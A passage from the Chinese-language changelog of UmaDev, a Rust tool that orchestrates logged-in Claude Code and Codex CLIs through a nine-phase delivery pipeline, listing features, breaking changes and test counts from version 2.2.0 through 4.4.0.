- **`runtime:` 报告标签误导。** 之前 offline 模式打印 `runtime: Anthropic (Claude Agent SDK)`,看上去是真在调 Claude SDK。修成 `runtime: Offline deterministic templates (no AI; demos / CI)` 或 `runtime: Host CLI worker — Claude Code (claude-code)`,名实相符。
- **`transition note` 用 `runtime:` 标签同上,改成 `worker:`** + 把 offline 写成 `offline-templates` 而不是 RuntimeKind 字符串。
- **`umadev verify` 多出一栏 worker。** `workflow-state: phase=... active_gate=... worker=claude-code ...`,审计链一眼看清哪个 worker 在跑。

### 新增

- **TUI gate 卡片**:停在 `docs_confirm` / `preview_confirm` 时,UmaDev 推一张完整卡片(待审稿工件清单 + `/continue` / `/revise` / `/diff` 三个动作 + 简短指引)。`Gate` 角色的消息额外用黄色 ╔══ ╗ 框包出来。
- **回车 `c` 快捷键**:在 gate 状态下,单字符 `c` / `C` 等价 `/continue`,和 gate 卡片承诺的快捷键名实相符。
- **`/model <id>`**:TUI 内切换 worker model 并落到 config.toml。
- **`/version` overlay**:binary / spec / worker / model / workspace / config 一览。
- **`/changelog` overlay**:`include_str!` 编译期内嵌本文件。
- **`/help` 分组**:从 17 条平铺改成 Worker / Pipeline & gates / Inspect / Editing & exit 四组,picker 模式保留 Navigation 单组。
- **聊天滚动指示**:历史超出可见区域时,标题动态变成 ` Conversation · ↑ N more above `。
- **Pre-flight 计划消息**:用户提交需求那一刻,UmaDev 推一条 9 阶段计划卡片(包含两道 gate 提示),消除"按了回车之后是不是没反应"的疑虑。
- **gate-aware 输入框标题** + **stage-aware did-you-mean**:`/quitz` → `/quit`,`/rev` → `/revise`,未启动 / 跑流水线中 / 已完成 三种状态的 `/continue` 各自给精确引导。
- **`/verify` overlay 含质量门得分**:`88/100 (PASSED)` 直接显示,不必再开 JSON。

### 改进

- `umadev continue --backend claude-code` 显式覆盖 worker(高于持久化字段)。
- Spec / Verify / Doctor / Diff / History overlay 已完整可用(M14b 留的 stub 已落地)。
- `UMADEV_CODEX_BIN` / `UMADEV_CODEX_EXEC_SUBCMD` 环境变量仍可覆盖默认值。
- `read_workflow_state` 向下兼容老的 state 文件(没有 `backend` 字段时默认为空)。

### 测试 +30 (4.4.0 基线 225 → 现在 255+)

- `app.rs` +13:gate 卡片、`c` 快捷键、`/model` 持久化、`/version` overlay、`/changelog` overlay、did-you-mean、preflight、`/verify` 质量门、JSON 标量解析器。
- `ui.rs` +5:gate-aware 标题、运行中标题、滚动指示、`/help` 分组渲染、对话滚动溢出。
- `state.rs` +2:backend 字段 round-trip、legacy state 向下兼容。
- 其它小修。

## [4.4.0] - 2026-05-23

### 主题

**Claude Code 同款 chat-style TUI**。`umadev` 一行进入对话界面,首次启动选 worker(claude-code / codex / offline)写入 `~/.umadev/config.toml`,之后直接进对话。所有操作走对话框 + 斜杠命令,不再有"Welcome → 流水线进度条"这种割裂屏幕。

### 破坏性变更

- **`umadev tui` 子命令删除** —— 直接 `umadev` 即可。CLI verbs(`run` / `continue` / `revise` / ...)保留给脚本用。
- **TUI 内部状态机重写**:`Welcome` + `Running` → `Picker` + `Chat`。welcome 屏 / 9-phase 进度面板 / 事件日志面板全部下线;chat 模式用滚动消息历史承载所有 pipeline 事件。
- **`umadev_tui::LaunchOptions` 字段精简**:删 `requirement` / `backend`,现在只剩 `project_root` / `slug` / `model`(用户选择从 config 读)。

### 新增

- **`crates/umadev-tui/src/config.rs`** —— `~/.umadev/config.toml` 读写。Fail-soft:文件不存在 / 解析失败 / IO 错误都退化为"无偏好,显示 picker"。
  - 字段:`backend = "claude-code" | "codex" | "offline"`、`model = "..."`。
  - 路径:`$XDG_CONFIG_HOME/umadev/config.toml` 优先,否则 `$HOME/.umadev/config.toml`。
- **首次启动 Picker** —— 三选项(claude-code / codex / offline)+ 实时 probe 标签。↑↓ 导航,Enter 写盘 + 进 Chat。不可用宿主拒绝(显示提示)。
- **Chat 主屏**:
  - 顶栏 status:版本 + workspace + ● backend + 当前 phase + ⏸ gate。
  - 滚动消息历史:`you` / `umadev` / `worker` / `gate` / `system` 5 种角色标签(各自颜色)。
  - 输入框:5 行高度,光标 ▌,/ 前缀自动列出候选命令。
  - 底部 footer hint。
- **斜杠命令路由器**:
  - `/claude` `/codex` `/offline` —— 切 worker(写 config + 系统消息)
  - `/continue` —— 批准 gate
  - `/revise <文字>` —— 提修订
  - `/help` `/?` `/commands` —— 帮助浮层
  - `/clear` —— 清屏 history
  - `/quit` `/q` `/exit` —— 退出
  - `/diff` `/spec` `/verify` `/doctor` `/history` —— 暂时给提示(浮层渲染留 M14b)
- **非斜杠输入路由**:无 run 在跑 → 当新需求;gate 打开 → 当修订;delivery 完成 → 当下一个新需求(自动 reset)。

### 测试 +28(共 ~225 总数,因为删了一批旧 Welcome/Running 测试)

- `config.rs` 7:round-trip / 缺失文件 / 损坏文件 / 创建父目录 / XDG_CONFIG_HOME。
- `app.rs` 21:Picker 导航/拒绝不可用/probe 刷新/转 Chat;Chat 普通文本提交/空回车 noop/斜杠 help quit clear claude continue revise/未知命令/gate 时文本当修订/delivery 后文本当新 run/host 输出/history 上限/F1 / spinner。
- `ui.rs` 8:Picker 三选项 + 选中标记/Chat 问候 + 输入框 + 光标 + slash typeahead/gate 角色/worker 角色/help overlay 模式相关。

### 变更

- 版本 4.3.0 → 4.4.0。
- 命令面 11 → 10(删 `tui` 子命令)。
- README / README_EN / CLAUDE.md / guide.txt 全部同步新心智模型。

## [4.3.0] - 2026-05-23

### 主题

大厂级用户交互打磨 + 流式输出 + 知识库智能注入 + CI 自动发 npm。

### 新增

- **`umadev examples`** —— 一行打印完整 cheat-sheet:首次用法 / CI 用法 / 迭代 / 切 backend / TUI 键位 / 斜杠命令 / 环境变量。
- **`umadev guide`** —— 60 秒走读:产品定位 / 9 阶段图 / 用户角色 / 9 命令 / 工件清单 / 治理规则。
- **每个命令富 `long_about` + `EXAMPLES:` 块** —— `umadev <cmd> --help` 给真实示例,不再干瘪。
- **typo 容错** —— `umadev rin` → `tip: some similar subcommands exist: 'init', 'run'`(clap 默认开,文案有效)。
- **`EngineEvent::HostOutput`** —— host CLI 的每行输出按行 emit 出来,TUI 实时滚动显示 host 在干啥(buffered-at-end,真 wire 流式留给 M9b)。
- **TUI App `HostOutput` 处理** —— 每行带 `    [phase]` 前缀进事件日志,长行 200 字符截断。
- **知识库智能注入** —— `summarise_knowledge_dir` 升级为 `smart_knowledge_digest`:按需求关键词排名 → 挑 top-6 → 每个真摘 600 字符塞进 prompt;无关键词匹配时 lex 排序兜底。
- **CI release.yml 接 npm publish** —— tag `v*` push 时,build 阶段同时把每平台 binary stage 进 `npm/cli-<plat>/`,publish-npm job 拉回来一键发 6 包(需配 `NPM_TOKEN` secret)。
- **`aarch64-unknown-linux-gnu` 平台** —— 用 `cross` 在 ubuntu-latest 上交叉编译,补全 Linux ARM 支持。

### 变更

- 版本 4.2.0 → 4.3.0。
- 命令面 9 → 11(新增 examples / guide)。

### 测试 +11 → **203 tests pass**

- `extract_keywords_filters_short_and_stopwords`
- `score_path_counts_keyword_hits`
- `smart_digest_picks_keyword_matches_top`
- `smart_digest_falls_back_to_lex_when_no_keyword_match`
- `smart_digest_handles_missing_dir`
- `host_output_lines_land_in_log`
- `host_output_truncates_very_long_lines`
- `examples_command_prints_cheatsheet`
- `guide_command_prints_walkthrough`
- `run_help_includes_examples`
- `unknown_subcommand_suggests_a_correction`

## [4.2.0] - 2026-05-23

### 主题

外挂式产品形态彻底落地:**删干净 plugin 注入式架构,主推 `npm install -g umadev` 一行装机**。

### 破坏性变更

- **`umadev install` / `uninstall` / `hook` 三个命令删除** —— 它们对应"把 SKILL.md/AGENTS.md/hook 配置注入宿主目录"的旧模型,和新定位(外挂项目经理,只调度不嵌入)矛盾。
- **`plugin/` 目录整体删除**(3 家宿主的 SKILL.md / AGENTS.md / plugin.json / hook config × 11 文件 + `crates/umadev/src/install.rs` 约 400 行实现)。
- **`umadev verify` 不再输出 `## Installed plugins` 节**。
- **`umadev doctor` 不再做插件相关检查**(check_embedded_plugins、check_installed_plugins、版本错配检测——这些都依赖 plugin 概念)。

### 新增

- **`npm/` 多平台分发** —— 主包 `umadev` + 5 个平台子包 `@umadev/cli-{darwin-arm64,darwin-x64,linux-x64,linux-arm64,win32-x64}`,esbuild / biome / swc 同款模式。
  - **JS shim** `npm/umadev/bin/cli.js`:`require.resolve` 找到匹配平台的预编译 Rust 二进制,`spawnSync(..., {stdio: 'inherit'})` 透传 stdio,TUI 直接可用。
  - **`stage.sh`** 把 prebuilt binary 摆进对应平台子包。
  - **`smoke.sh`** 本地端到端验证(本机已实测通过)。
  - **`publish.sh`** 一行发布 6 包(5 平台 + 主包)。

### 变更

- 版本 4.1.0 → 4.2.0。
- 命令面从 12 个瘦身到 9 个(删 install/uninstall/hook)。
- `umadev init` 输出的"next steps"提示从"umadev install claude-code"改成"umadev"启动 TUI。
- `umadev-governance` crate **保留**(pipeline 内部仍用 audit / context / compliance),只是没有 CLI 出口。

### 测试 +0 / 192 总数

(删测试和加测试相抵:删 1 个 `hook_check_emoji_returns_block_decision_for_tsx` e2e,删 doctor 的若干 plugin 检测测试,删 install.rs 的 7 个内部测试;保留所有 pipeline / verify loop / TUI / spec / runtime 相关测试。)

## [4.1.0] - 2026-05-23

### 主题

定位钉死:**UmaDev 是 AI 编码的项目经理(确定性外挂编排 Agent),不是 LLM 客户端**。彻底删掉所有"直调 LLM API"的代码与外宣口径。

### 破坏性变更

- **`umadev-runtime` 的 `anthropic` / `openai` / `antigravity` 三个 HTTP 客户端模块删除**——`umadev` 二进制不再含直调 Provider API 的能力。
- **CLI `--api` flag + `--runtime` flag 移除**——run/tui 现在只有两种"大脑":`--backend claude-code|codex`(默认推荐)或离线模板。
- **`umadev-runtime` 不再依赖 `reqwest` / `eventsource-stream` / `tokio::process` / `anyhow` / `tracing`**——降为纯 trait crate(`Runtime` + `OfflineRuntime`),依赖只剩 `async-trait` / `serde` / `serde_json` / `thiserror`。
- `RuntimeError::Transport` / `RuntimeError::Provider` 两个 HTTP 变体删除。

### 新增

- **`umadev` 无参数直接进 TUI** —— 像 `claude` / `codex` 那样,敲一个词就开干。
- **TUI Welcome 屏** —— 自动并发探测 `claude` / `codex`,自动选第一个 ready 的;用户在 TUI 内文本框输入需求,`Tab` 切换工作者,`Enter` 提交进入 Running。
- TUI `LaunchOptions` 替代旧 `(RunOptions, Option<String>)` 参数对。
- `Action::Submit` 事件 —— 从 Welcome 提交后,event loop 自动 build `RunOptions` + spawn pipeline + 切到 Running 模式。
- `App::cycle_backend()` —— `Tab` 在 `[offline, ...ready_backends]` 之间循环。
- `App::enter_running()` —— 显式状态机翻页。

### 变更

- 版本 4.0.0 → 4.1.0。
- 主标语:"a coach for AI coding hosts" → "**AI 编码的项目经理 — drives your logged-in Claude Code / Codex through a 9-phase commercial delivery pipeline. No API key needed.**"
- README / README_EN / spec §9 全部清掉"three SDK runtimes"线,统一"项目经理 + host driver"口径。
- `apply_key(char)` → `apply_key(KeyCode)`,模型层处理 Backspace / Enter / Tab / Esc 等专用键。

## [4.0.0] - 2026-05-22

### 主题

从"装进宿主的插件"演进为"驱动宿主的编排器"：UmaDev 现在是一个 TUI 应用，把用户**已登录的** Claude Code / Codex CLI 当作按需调用的执行后端——零 API key，零额外登录。

### 破坏性变更

- **`umadev run` 的 `--offline` 标志移除**：执行模式改为三选一——`--backend claude-code|codex`（驱动已登录的宿主 CLI）、`--api`（直调 Provider API，需 key）、或默认离线确定性模板。

### 新增

- **`crates/umadev-host`** —— 宿主驱动层。`ClaudeCodeDriver` 包 `claude --print`、`CodexDriver` 包 `codex exec`，都实现 `Runtime` trait 让现有 `AgentRunner` 直接驱动。子进程走 `tokio::process` + `.args()`（不走 shell）、`kill_on_drop`、超时保护。`probe_all()` 并发探测宿主可用性。
- **`crates/umadev-tui`** —— ratatui 终端应用。`umadev tui "<需求>"` 启动：9 阶段进度面板 + 实时事件日志 + gate 键盘交互（`c` 过 gate / `q` 退出）+ `b` 宿主探测浮层。
- **引擎事件流**（`umadev-agent::events`）：`EngineEvent` + `EventSink`（`NullSink` / `ChannelSink` / `RecordingSink`）。`AgentRunner` 在 phase 起止、artifact 写入、gate 打开时 emit 事件;TUI 订阅 `ChannelSink` 渲染实时进度。
- **`umadev init`** —— 写出 `umadev.yaml` spec manifest（落地 UD-META-001）;`umadev run` 也会自动补写。
- **`umadev doctor`** —— 自检命令:binary 完整性、嵌入 plugin/规范、workspace 可写、已装 plugin 版本错配。
- **`umadev uninstall`** —— 移除宿主插件，保留 `.umadev/` 用户数据。
- **`umadev tui`** —— 进入交互式 TUI。

### 变更

- 版本 3.0.0 → 4.0.0。
- spec §7 主机映射表对齐到三家官方 SDK 家族，明确其余宿主 out-of-scope。
- `OfflineRuntime` 从二进制提到 `umadev-runtime`，CLI 与 TUI 共用;新增 `Box<dyn Runtime>` impl。
- CONTRIBUTING.md 改写为 Rust workspace 贡献指南。

### crate 总览（7 个）

`umadev` · `umadev-spec` · `umadev-governance` · `umadev-agent` · `umadev-runtime` · `umadev-host` · `umadev-tui`

## [3.0.0] - 2026-05-20

### 主题

彻底重构：Python → Rust，从工具 → 规范产品，从 30 个浅适配宿主 → 3 个深度兼容宿主家族。

### 破坏性变更

- **语言切换**：整个项目从 Python 改写为 Rust workspace。所有 `umadev/` Python 代码、`pyproject.toml`、`uv.lock`、`requirements.lock`、Python 测试套件全部移除。
- **CLI 全面重构**：50+ 子命令收紧为 4 条（`run` / `spec` / `hook` / `verify`）。Python 时代的 `init / migrate / setup / detect / doctor / quality / review / release / enforce / spec / config / hooks / experts / memory / compact / pipeline / clean / completion / feedback / ...` 等命令全部删除。
- **宿主适配从 30 个收紧到 3 个**：只保留有官方 Agent SDK 的家族——Anthropic（Claude Code / Claude Desktop）、OpenAI（Codex CLI / Codex Desktop）、Google（Antigravity CLI / Antigravity Desktop）。Cursor、Windsurf、Cline、Roo、Continue、Trae、Qoder、CodeBuddy、WorkBuddy、Kiro、Droid、Gemini CLI、Kimi、Qwen 等 27 个浅适配宿主全部移除。
- **MCP server 退场**：纯 Rust 直调 Provider API，不再需要 MCP 中转。
- **SKILL.md / hook 安装器退场**：Python 时代的 `.claude-plugin/`、`plugins/`、宿主 hook 注入器全部移除；规范由 agent 直接驱动，而非由各家宿主的 hook 实现。

### 新增

- **Rust workspace**（5 个 crate）：
  - `umadev` — 主二进制
  - `umadev-spec` — 规范的 Rust 数据表达（25 条 clause × 4 层 + 9 阶段 + 2 gate）
  - `umadev-governance` — 治理核心（`rules` / `audit` / `context` / `compliance`），fail-open
  - `umadev-agent` — 9 阶段流水线 runner + gate 语义 + workflow state
  - `umadev-runtime` — Anthropic / OpenAI / Antigravity 三家 HTTP 适配（直调 Provider API）
- **`UMADEV_HOST_SPEC_V1` 规范本体**进入 `spec/` 顶层目录，与代码 1:1 对齐
- **单二进制分发**：`cargo build --release` 出一个静态二进制，零运行时依赖
- **`umadev hook`** 子命令把所有治理判定收敛到一条入口：宿主配置只写 `umadev hook check-emoji` 等命令，无需 Python 解释器
- **多 runtime 选择**：`umadev run "..." --runtime anthropic|openai|antigravity`

### 保留

- `spec/UMADEV_HOST_SPEC_V1.md` — 规范本体
- `knowledge/` — 治理知识库
- `umadev-website/` — Next.js 官网（独立工程）
- `docs/assets/` — README 图片
- `output/`、`.umadev/` — 用户项目数据（gitignore）

### 迁移

- 没有 from-2.4 的迁移路径。3.0 是从零重启；旧 Python 用户保留旧版本即可。

## [2.3.4] - 2026-04-10

### 主题

Plan-Execute 编排升级 + Overseer 监督者 + Claude/Codex 混合审查

### 致谢

- 感谢 **staruhub** 提交并推动合入 [PR #10](https://github.com/umacloud/umadev/pull/10)，本次版本的核心能力来自这次贡献。

### 新增

- **Plan-Execute 执行引擎**：结构化执行计划、拓扑波次排序、步骤状态机、步骤级验证门、失败预算和持久化计划状态。
- **Overseer 监督者角色**：独立质量观察者，在阶段与步骤检查点持续监控计划偏差、质量下降和未解决审查结果，并可在关键问题下中止流水线。
- **Claude Code + Codex 混合模式**：Claude Code 负责实现、Codex 负责独立审查，审查结果由 Overseer 统一跟踪和校验。
- 新增配置项：`execution_mode`、`overseer_enabled`、`codex_review_enabled`、`codex_review_phases`、`overseer_halt_on_critical`、`plan_failure_budget`。

### 变更

- 官网首页已同步到 `2.3.4`。
- 官网更新历史页已新增 `2.3.4` 条目。
- README、发布说明和版本真源已统一到 `2.3.4`。

## [2.3.3] - 2026-04-07

### 主题

宿主适配质量 + 安装升级体验

### 废弃

- **Claude Code 不再安装 `umadev-core` 别名**：统一为 `umadev` 单一入口。升级后自动清理旧版残留（对用户无感）。

### 新增

- **`umadev update` 升级后自动迁移**：pip/uv 升级完成后自动调用新版 `umadev migrate`，一步完成升级+迁移。
- **`umadev` 无参数自动迁移旧版**：检测到项目配置版本低于当前 CLI 版本时自动迁移。
- **`umadev migrate` 全宿主迁移**：重写为全宿主迁移引擎，自动检测所有已接入宿主并重建配置/Skill/slash/协议到最新版。
- **`--auto` 同族宿主智能去重**：同时检测到 cursor + cursor-cli 等同族宿主时自动选择功能更完整的 CLI 版本。
- **Roo Code**：IntegrationTarget 补齐 `.roo/commands/umadev.md`。
- **OpenCode**：IntegrationTarget 补齐 `.opencode/commands/umadev.md`。
- **Kilo Code**：补齐项目级 `.kilocode/skills/umadev-core/SKILL.md` 和用户级 Skill surface。
- **VS Code Copilot**：补齐 HOST_CERTIFICATIONS 认证条目。

### 修复

- **commands 文件内容错误**：`setup()` 生成 `.roo/commands/`、`.opencode/commands/` 等 command 文件时走 fallback 生成了通用 rules 内容而非 slash command 格式。
- **SkillFrontmatter 默认 name**：从 `"umadev-core"` 改为 `"umadev"`。
- **所有 `skill_name="umadev-core"` 硬编码**：全部改为 target-aware 或统一为 `"umadev"`。
- **`install.sh` Skill 提示**：去除 `umadev-core` 名称。
- **版本提示**：统一为 `umadev update` 而非 `pip install -U`。

### 测试验证

- 全量 2151 测试通过，0 失败。

## [2.3.2] - 2026-04-06

### 新增

- Claude Code 按 `CLAUDE.md + .claude/skills + ~/.claude/skills + optional plugin enhancement` 收口。
- Codex 按 `AGENTS.md + .agents/skills + repo plugin enhancement` 收口，并区分 App/Desktop、CLI、fallback 三入口。
- `session_resume_card`、`doctor`、`detect`、`start`、`continue`、Web API 显示现实场景卡（第二天回来继续开发、只想知道当前唯一下一步、当前确认门内继续修改、本地流程中断后恢复）。
- `.umadev/SESSION_BRIEF.md` 新增 `## 现实场景怎么做` 段落。
- 新增/强化 `workflow-history`、语义 workflow 事件、`hook-history`、`workflow/framework/hook/operational harness`、`recent operational timeline`，已进入 `proof-pack`、`release readiness`、恢复卡、`SESSION_BRIEF`。
- `framework_playbook` 覆盖 `uni-app`、`Taro`、`React Native`、`Flutter`、`Desktop Web Shell`，进入提示词、UIUX 文档、`ui-contract.json`、frontend/implementation builder、runtime/quality gate/proof-pack/release readiness。

### 变更

- 21 个宿主口径继续收正：`20` 个统一接入宿主 + `1` 个 OpenClaw 手动插件宿主。
- Kiro / Qoder / Cursor / Trae / CodeBuddy 等宿主的官网说明、安装引导、能力审计页与代码模型重新对齐。
- emoji 作为功能图标被系统级禁止，被 runtime、UI review、quality gate、release readiness 一起拦截。

## [2.3.1] - 2026-04-03

### 新增

- Codex 深度适配：`AGENTS.md + Skills + repo plugin 增强` 双层模型。
- Codex 三入口统一：App/Desktop `/umadev`、CLI `$umadev`、回退 `umadev: 你的需求`。
- Claude Code 深度适配：`CLAUDE.md + .claude/skills + ~/.claude/skills + optional plugin enhancement`。

### 变更

- 安装引导不再使用"slash 宿主 / 非 slash 宿主"二分法，改为基于宿主真实入口模型。
- Codex 标记为 skill-first 模式（App/Desktop `/umadev`、CLI `$umadev`）。
- Claude Code 标记为 `CLAUDE.md + Skills` 主模型，`commands / agents` 仅作为兼容层保留。
- Onboard 完成页删除过期 `/umadev init` 提示，改为真实宿主入口指导。
- 版本真源统一为 `2.3.1`，README / README_EN / QUICKSTART / HOST_USAGE_GUIDE / INSTALL_OPTIONS 同步更新。
- 官网首页 Hero、终端演示、更新历史同步到 `2.3.1`。

## [2.3.0] - 2026-03-31

### 新增

#### Enforcement 执行层

- `umadev enforce install` — 自动为宿主配置 hooks（PreToolUse emoji 检查等）。
- `umadev enforce validate` — 运行验证脚本，检查 emoji/import/color/route 合规性。
- `umadev enforce status` — 查看当前执行层配置状态。
- `umadev detect --auto` 时自动安装 enforcement hooks。

#### Memory 记忆系统

- `umadev memory list` — 列出所有项目记忆。
- `umadev memory show <name>` — 查看指定记忆内容。
- `umadev memory forget <name>` — 删除指定记忆。
- `umadev memory consolidate` — 触发 Dream 整合。
- 4 种记忆类型：user、feedback、project、reference。
- MEMORY.md 索引，200 行 / 25KB 自动限制。
- Dream 整合器：4 阶段后台记忆合并（去重、聚合、摘要、写回）。

#### 代码生成器

- `umadev generate scaffold --frontend next` — Next.js App Router 项目脚手架（16 个文件）。
- `umadev generate components` — UI 组件脚手架（Button/Card/Input/Modal/Nav/Layout）。
- `umadev generate types` — 从架构文档生成共享 TypeScript 类型。
- `umadev generate tailwind` — 从 UIUX 设计 tokens 生成 Tailwind 配置。

#### Expert 专家系统

- `umadev experts list` — 列出所有专家（内置 + 自定义）。
- `umadev experts show <name>` — 查看专家定义。
- 12 位内置专家 Markdown 定义：PM、ARCHITECT、UI、UX、SECURITY、CODE、DBA、QA、DEVOPS、RCA、PRODUCT、VERIFICATION。
- 用户可通过 `.umadev/experts/*.md` 自定义专家。
- 新增对抗性验证专家（VERIFICATION.md），在质量门禁中担任"红方"角色。

#### Hook 系统

- `umadev hooks list` — 列出已配置的 hooks。
- `umadev hooks test <event>` — 测试 hook 执行。
- 8 种 hook 事件：PrePhase、PostPhase、PreDocument、PostDocument、PreQualityGate、PostQualityGate、OnError、SessionStart。
- 在 `umadev.yaml` 中通过 YAML 配置，支持 Shell 和 Python 执行器。

#### Context Compact（上下文压缩）

- `umadev compact list` — 列出各阶段的压缩摘要。
- `umadev compact show` — 查看指定阶段的压缩内容。
- 9 段结构化摘要模板，自动在阶段切换时保存/恢复上下文。

#### Web API

- 11 个新端点：记忆管理、hooks 管理、专家查询、上下文压缩、会话状态等。

#### 条件规则系统

- 新模块 `umadev/rules/` — 支持 `.umadev/rules/*.md` 条件规则。
- 规则可通过 frontmatter `paths` 指定只对特定文件生效，支持排除模式。

#### UX 增强

- 首次使用引导：3 步快速开始面板，最多显示 4 次后自动隐藏。
- Tips 提示系统：根据当前阶段显示上下文相关的操作建议。
- 项目模板：`umadev init --template ecommerce/saas/dashboard/mobile/api/blog/miniapp`。
- `doctor --fix`：自动修复检测到的安装问题。
- Shell 补全：`umadev completion bash/zsh/fish`。
- 版本更新检查：PyPI 24h 缓存，有新版时提示升级。
- `umadev feedback`：快速打开 GitHub Issues 反馈。
- `umadev migrate`：2.2.0 → 2.3.0 一键迁移。

### 变更

- Skill 模板引擎升级：支持宿主特定 frontmatter 渲染、编码前门禁、常见错误速查、阶段宣告机制。
- Prompt 生成器重构为分层注册制（9 段优先级架构），支持数据驱动规则和行为约束模板。
- Pipeline 引擎集成 Hook 系统、上下文压缩、记忆提取、Session Brief 全链路增强。
- CLAUDE.md 增强：编码约束段、技术栈预研要求、图标与视觉规则、前后端对齐规则、每文件自检要求。
- 4-Agent 并行审查框架（复用 + 质量 + 效率 + 安全）。
- 验证脚本增强：多级输出（Level 1 阻塞 / Level 2 警告 / Level 3 建议），新增 console.log / hardcoded localhost / TODO-FIXME / 大文件 / package.json scripts 检查。
- `--help` 分组显示（核心 / 治理 / 分析）。
- 品牌输出使用纯 ASCII 字符，兼容所有终端。
- 版本号全面统一为 2.3.0。

### 破坏性变更

- 版本号从 2.2.0 升级至 2.3.0。
- `umadev.yaml` 中 version 字段默认值变更为 2.3.0。
- 配置迁移：运行 `umadev detect --auto` 以更新宿主集成配置。

### 修复

- `detect --auto` 现在会实际安装文件（之前仅生成报告）。
- `detect` 与 `doctor` 现在使用相同的检测逻辑（不再出现互相矛盾的结果）。
- `umadev` 无参数时显示欢迎信息而非内部状态。
- `umadev status` 在初始化后显示"已初始化，等待开始"。
- SKILL.md 中 `config show` 修正为 `config list`。
- 仓库地址修正为 `umacloud/umadev`。

### 测试验证

- 全量测试：1643 passed。
- `ruff check`：通过。
- `python3 -m compileall umadev`：通过。

## [2.2.0] - 2026-03-29

### 新增

- 重构工作流状态机与恢复链，补齐 `resume / next / SESSION_BRIEF / workflow-state` 语义，支持下班后、宿主关闭后、第二天回来继续当前流程。
- 宿主接入与诊断链路升级，统一 `start / detect / doctor / Web API` 的决策卡与恢复卡。
- UI 系统正式接入主流程：新增 `ui-contract.json`、`design-tokens.css`、`ui-contract-alignment`，从需求到 release 全链路治理。
- Release / proof-pack / quality gate / release readiness 进一步打通。
- UI 组件生态偏向 `shadcn/ui + Radix + Tailwind`，允许基于场景选择更合适方案。
- UI review 新增对主题入口、导航骨架、组件导入路径、反模式命中的结构化检查。
- `quality gate`、`proof-pack`、`release readiness`、`frontend-runtime` 均已纳入 UI 契约执行校验。
- 支持 Windows / 自定义安装路径发现逻辑，支持 `UMADEV_HOST_PATH_<HOST>` 覆盖。

### 变更

- 正式产品口径统一为 `20` 个统一接入宿主，`OpenClaw` 改为手动插件安装路径。
- 宿主安装、检测、恢复、继续、返工、发布动作语义统一。
- 显式指定宿主时，系统会围绕该宿主给出决策，不再被自动检测结果带偏。

### 测试验证

- 全量测试：1281 passed。
- `ruff check`：通过。
- `python3 -m compileall umadev`：通过。
